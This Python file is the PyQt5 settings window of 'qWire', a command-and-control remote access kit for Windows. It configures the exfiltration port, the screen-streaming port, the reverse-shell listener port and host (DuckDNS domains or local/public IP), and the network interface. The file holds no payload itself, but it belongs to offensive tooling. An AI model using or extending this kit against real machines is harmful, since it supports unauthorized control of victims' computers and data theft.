#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.0
# -------------------------------------------------------------
from PyQt5 import QtCore, QtGui, QtWidgets
from ..logging.logging import ConsoleWindow
from ..Qt5.duck_dns_token_window import Ui_dns_token_window
from ..Qt5.domains_window import Ui_domains_window
from ..Qt5.icons import IconObj
from ..utils.utils import Validation,Notifications
from ..utils.file_paths import BGPath
from ..logging.logging import NetworkingConfigs,DNSconfigs
from ..networking.IP_Handler import NicHandler

class Ui_settings_window(object):

    #Function will change the stream port
    def change_stream_port(self):
        port = self.stream_port_input.text()                #Get port
        if Validation().Validate_port_number(port):         #if the port is valid
            NetworkingConfigs().write_stream_port(port)     #write the port
            Notifications().raise_notification(f'Updated streaming port to {port}','Success')   #Notify the user

    #Function will change the exfiltration port
    def change_exfil_port(self):
        port = self.exfil_port_input.text()                 #Get port
        if Validation().Validate_port_number(port):         #If the port is valid
            NetworkingConfigs().write_exfil_port(port)      #Write the port
            Notifications().raise_notification(f'Updated exfiltration port to {port}','Success')    #Notify user

    #Function will validate given port and write it to the file if the function returns true
    def change_shell_port(self):
        port = self.shell_port_input.text()                    #Get the text in the box
        if Validation().Validate_port_number(port):            #Validate it. If port is valid
            NetworkingConfigs().write_shell_lport(port)        #write the port
            Notifications().raise_notification(f'Updated shell port to {port}','Success')  #Notify user

    #Function will change the shell domain
    def change_host_domain(self):
        host = NicHandler().validate_host(self.host_combobox.currentText())#Get the current text from domain combo box
        DNSconfigs().write_shell_domain(host)                #Write the domain to the shell config file
        Notifications().raise_notification(f'Updated shell host to {host}','Success')   #Inform user

    #Function will change the network interface that the server operates on
    def change_network_interface(self):
        interface = self.nic_combo_box.currentText()                #Retrieve interface
        NetworkingConfigs().write_network_interface(interface)      #Write interface to the config file
        Notifications().raise_notification(f'Updated network interface to {interface}','Success') #Notify user

    def open_new_window(self,UI):
        self.window = QtWidgets.QDialog()
        self.ui = UI()
        self.ui.setupUi(self.window)
        self.window.show()

    def setupUi(self, settings_window):
        settings_window.setObjectName("settings_window")
        settings_window.resize(528, 464)
        settings_window.setWindowIcon(IconObj().settings_icon)
        self.settings_tabs = QtWidgets.QTabWidget(settings_window)
        self.settings_tabs.setGeometry(QtCore.QRect(10, 10, 511, 441))
        self.settings_tabs.setAutoFillBackground(True)
        self.settings_tabs.setStyleSheet(f"background-image: url({BGPath().settings_window_bg});")
        self.settings_tabs.setObjectName("settings_tabs")
        self.logging_tab = QtWidgets.QWidget()
        self.logging_tab.setObjectName("logging_tab")
        self.clear_logs_button = QtWidgets.QPushButton(self.logging_tab, clicked=lambda: ConsoleWindow().clear_console_logs())
        self.clear_logs_button.setGeometry(QtCore.QRect(10, 10, 151, 31))
        self.clear_logs_button.setObjectName("clear_logs_button")
        self.settings_tabs.addTab(self.logging_tab, "")
        self.networking_tab = QtWidgets.QWidget()
        self.networking_tab.setObjectName("networking_tab")
        self.domain_group_box = QtWidgets.QGroupBox(self.networking_tab)
        self.domain_group_box.setGeometry(QtCore.QRect(10, 10, 121, 91))
        self.domain_group_box.setObjectName("domain_group_box")
        self.add_domain_button = QtWidgets.QPushButton(self.domain_group_box,clicked=lambda: self.open_new_window(Ui_domains_window))
        self.add_domain_button.setGeometry(QtCore.QRect(10, 30, 100, 21))
        self.add_domain_button.setObjectName("add_domain_button")
        self.dns_token_button = QtWidgets.QPushButton(self.domain_group_box,clicked=lambda: self.open_new_window(Ui_dns_token_window))
        self.dns_token_button.setGeometry(QtCore.QRect(10, 50, 100, 21))
        self.dns_token_button.setObjectName("dns_token_button")
        self.NIC_groupbox = QtWidgets.QGroupBox(self.networking_tab)
        self.NIC_groupbox.setGeometry(QtCore.QRect(140, 10, 171, 61))
        self.NIC_groupbox.setObjectName("NIC_groupbox")
        self.nic_combo_box = QtWidgets.QComboBox(self.NIC_groupbox)
        self.nic_combo_box.setGeometry(QtCore.QRect(90, 30, 81, 21))
        self.nic_combo_box.setObjectName("nic_combo_box")
        for interface in NicHandler().get_all_interfaces():
            self.nic_combo_box.addItem(interface)
        self.nic_combo_box.setCurrentText(NetworkingConfigs().retrieve_network_interface())
        self.update_nic_button = QtWidgets.QPushButton(self.NIC_groupbox,clicked=lambda: self.change_network_interface())
        self.update_nic_button.setGeometry(QtCore.QRect(5, 30, 71, 21))
        self.update_nic_button.setObjectName("update_nic_button")
        self.exfil_port_groupbox = QtWidgets.QGroupBox(self.networking_tab)
        self.exfil_port_groupbox.setGeometry(QtCore.QRect(320, 10, 181, 80))
        self.exfil_port_groupbox.setObjectName("exfil_port_groupbox")
        self.exfil_port_input = QtWidgets.QLineEdit(self.exfil_port_groupbox)
        self.exfil_port_input.setGeometry(QtCore.QRect(90, 30, 81, 33))
        self.exfil_port_input.setObjectName("exfil_port_input")
        self.exfil_port_input.setText(NetworkingConfigs().retrieve_exfil_port())
        self.exfil_update_button = QtWidgets.QPushButton(self.exfil_port_groupbox,clicked=lambda: self.change_exfil_port())
        self.exfil_update_button.setGeometry(QtCore.QRect(10, 40, 61, 21))
        self.exfil_update_button.setObjectName("exfil_update_button")
        self.stream_port_groupbox = QtWidgets.QGroupBox(self.networking_tab)
        self.stream_port_groupbox.setGeometry(QtCore.QRect(320, 100, 181, 80))
        self.stream_port_groupbox.setObjectName("stream_port_groupbox")
        self.stream_port_input = QtWidgets.QLineEdit(self.stream_port_groupbox)
        self.stream_port_input.setGeometry(QtCore.QRect(90, 30, 81, 33))
        self.stream_port_input.setObjectName("stream_port_input")
        self.stream_port_input.setText(NetworkingConfigs().retrieve_stream_port())
        self.stream_update_button = QtWidgets.QPushButton(self.stream_port_groupbox,clicked=lambda: self.change_stream_port())
        self.stream_update_button.setGeometry(QtCore.QRect(10, 40, 61, 21))
        self.stream_update_button.setObjectName("stream_update_button")
        self.settings_tabs.addTab(self.networking_tab, "")
        self.client_handler_tab = QtWidgets.QWidget()
        self.client_handler_tab.setObjectName("client_handler_tab")
        self.shells_group_box = QtWidgets.QGroupBox(self.client_handler_tab)
        self.shells_group_box.setGeometry(QtCore.QRect(10, 10, 241, 111))
        self.shells_group_box.setObjectName("shells_group_box")
        self.host_combobox = QtWidgets.QComboBox(self.shells_group_box)
        self.host_combobox.setGeometry(QtCore.QRect(90, 30, 151, 27))
        self.host_combobox.setStyleSheet("")
        self.host_combobox.setObjectName("domain_combobox")
        for domain in DNSconfigs().retrieve_dns_domains():              #for domains in the domains text file
            self.host_combobox.addItem(domain)                        #add domain to dropdown menu
        self.host_combobox.addItem('Local IP')
        self.host_combobox.addItem('Public IP')
        self.host_combobox.setCurrentText(DNSconfigs().retrieve_domain_for_shell())
        self.host_button = QtWidgets.QPushButton(self.shells_group_box, clicked=lambda: self.change_host_domain())
        self.host_button.setGeometry(QtCore.QRect(10, 30, 71, 21))
        font = QtGui.QFont()
        font.setPointSize(13)
        self.host_button.setFont(font)
        self.host_button.setObjectName("host_label")
        self.port_button = QtWidgets.QPushButton(self.shells_group_box,clicked=lambda: self.change_shell_port())
        self.port_button.setGeometry(QtCore.QRect(10, 80, 71, 21))
        font = QtGui.QFont()
        font.setPointSize(13)
        self.port_button.setFont(font)
        self.port_button.setObjectName("port_label")
        self.shell_port_input = QtWidgets.QLineEdit(self.shells_group_box)
        self.shell_port_input.setGeometry(QtCore.QRect(90, 70, 151, 33))
        self.shell_port_input.setObjectName("shell_port_input")
        self.settings_tabs.addTab(self.client_handler_tab, "")
        self.retranslateUi(settings_window)
        self.settings_tabs.setCurrentIndex(0) #Pick which tab to open the settings window on
        QtCore.QMetaObject.connectSlotsByName(settings_window)

    def retranslateUi(self, settings_window):
        _translate = QtCore.QCoreApplication.translate
        settings_window.setWindowTitle(_translate("settings_window", "qWire Settings"))
        self.clear_logs_button.setText(_translate("settings_window", "Clear Console Logs"))
        self.settings_tabs.setTabText(self.settings_tabs.indexOf(self.logging_tab),
                                      _translate("settings_window", "Logging"))
        self.domain_group_box.setTitle(_translate("settings_window", " Domain Handler"))
        self.add_domain_button.setText(_translate("settings_window", "Domains"))
        self.dns_token_button.setText(_translate("settings_window", "Dns Token"))
        self.NIC_groupbox.setTitle(_translate("settings_window", "Network Interface"))
        self.update_nic_button.setText(_translate("settings_window", "Update"))
        self.exfil_port_groupbox.setTitle(_translate("settings_window", "Exfiltration Port"))
        self.exfil_update_button.setText(_translate("settings_window", "Update"))
        self.stream_port_groupbox.setTitle(_translate("settings_window", "Stream Port"))
        self.stream_update_button.setText(_translate("settings_window", "Update"))
        self.settings_tabs.setTabText(self.settings_tabs.indexOf(self.networking_tab),
                                      _translate("settings_window", "Networking"))
        self.shells_group_box.setTitle(_translate("settings_window", "                      Shell Settings"))
        self.host_button.setText(_translate("settings_window", "     Host"))
        self.port_button.setText(_translate("settings_window", "     Port"))
        self.settings_tabs.setTabText(self.settings_tabs.indexOf(self.client_handler_tab),
                                      _translate("settings_window", "Client Handling"))
        self.shell_port_input.setText(_translate("settings_window",NetworkingConfigs().retrieve_shell_lport()))
